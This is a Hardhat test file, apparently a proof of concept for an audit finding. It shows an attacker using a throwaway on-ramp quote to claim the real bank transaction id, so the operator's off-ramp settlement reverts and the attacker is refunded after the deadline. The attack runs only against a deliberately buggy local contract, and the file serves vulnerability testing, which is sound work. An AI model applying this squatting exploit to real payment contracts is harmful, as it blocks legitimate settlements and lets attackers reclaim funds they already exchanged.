import { expect } from "chai";
import { network } from "hardhat";


describe("H-1: bank-tx-id squatting via shared usedBankTxIds", function () {
  let ethers, networkHelpers;
  let oracle, raahva;
  let owner, operator, attacker;
  let raahvaAddress, chainId;

  const RATE_PRECISION = 10n ** 8n;
  const EXCHANGE_RATE = 280n * RATE_PRECISION; // 280 PKR per 1 USDC, 8 decimals

  const RampType = { OnRamp: 0, OffRamp: 1 };
  const Status = {
    QuoteCreated: 0n,
    Funded: 1n,
    ProofSubmitted: 2n,
    Settled: 3n,
    Refunded: 4n,
    Expired: 5n,
  };

  before(async function () {
    ({ ethers, networkHelpers } = await network.create());
    [owner, operator, attacker] = await ethers.getSigners();

    oracle = await ethers.deployContract("Oracle");
    await oracle.connect(owner).updateRate(EXCHANGE_RATE);

    raahva = await ethers.deployContract("BuggyRaahvaPay", [
      await oracle.getAddress(),
      operator.address,
    ]);
    raahvaAddress = await raahva.getAddress();
    chainId = (await ethers.provider.getNetwork()).chainId;

    // Seed the liquidity pool so a throwaway on-ramp quote can be created.
    await raahva.connect(owner).supplyLiquidity({ value: ethers.parseEther("1000") });
  });

  async function signOffRamp(quoteId, user, pkrAmount, bankTxIdHash, deadline) {
    const domain = {
      name: "Raahva Pay",
      version: "1",
      chainId,
      verifyingContract: raahvaAddress,
    };
    const types = {
      OffRampPaymentVerification: [
        { name: "quoteId", type: "uint256" },
        { name: "user", type: "address" },
        { name: "pkrAmount", type: "uint256" },
        { name: "bankTxIdHash", type: "bytes32" },
        { name: "deadline", type: "uint256" },
      ],
    };
    return operator.signTypedData(domain, types, {
      quoteId,
      user,
      pkrAmount,
      bankTxIdHash,
      deadline,
    });
  }

  it("blocks legitimate settlement and lets the attacker get refunded anyway", async function () {
    const offRampAmount = ethers.parseEther("10"); 

    await raahva.connect(attacker).createQuote(offRampAmount, RampType.OffRamp);
    const offRampQuoteId = 0n;
    await raahva.connect(attacker).fundOffRampQuote(offRampQuoteId, { value: offRampAmount });

    let quote = await raahva.quotes(offRampQuoteId);
    expect(quote.status).to.equal(Status.Funded);

    const realBankTxId = "REAL-BANK-TX-2026-00917";
    const realBankTxIdHash = ethers.keccak256(ethers.toUtf8Bytes(realBankTxId));

    const onRampPkrAmount = 3000n; 
    await raahva.connect(attacker).createQuote(onRampPkrAmount, RampType.OnRamp);
    const squatQuoteId = 1n;

    await raahva.connect(attacker).sumbitBankProof(squatQuoteId, realBankTxId);

    expect(await raahva.usedBankTxIds(realBankTxIdHash)).to.equal(true);

    quote = await raahva.quotes(offRampQuoteId);
    const signature = await signOffRamp(
      offRampQuoteId,
      attacker.address,
      quote.pkrAmount,
      realBankTxIdHash,
      quote.settlementDeadline
    );

    await expect(
      raahva.connect(operator).settleOffRampQuote(offRampQuoteId, realBankTxIdHash, signature)
    ).to.be.revertedWithCustomError(raahva, "TxIdAlreadyUsed");

    await networkHelpers.time.increase(601); // > 10 minutes

    const balBefore = await ethers.provider.getBalance(attacker.address);
    const tx = await raahva.connect(attacker).refundQuote(offRampQuoteId);
    const receipt = await tx.wait();
    const gasCost = receipt.gasUsed * receipt.gasPrice;
    const balAfter = await ethers.provider.getBalance(attacker.address);

    expect(balAfter - balBefore + gasCost).to.equal(offRampAmount);

    quote = await raahva.quotes(offRampQuoteId);
    expect(quote.status).to.equal(Status.Refunded);

    expect(await raahva.usedBankTxIds(realBankTxIdHash)).to.equal(true);
  });
});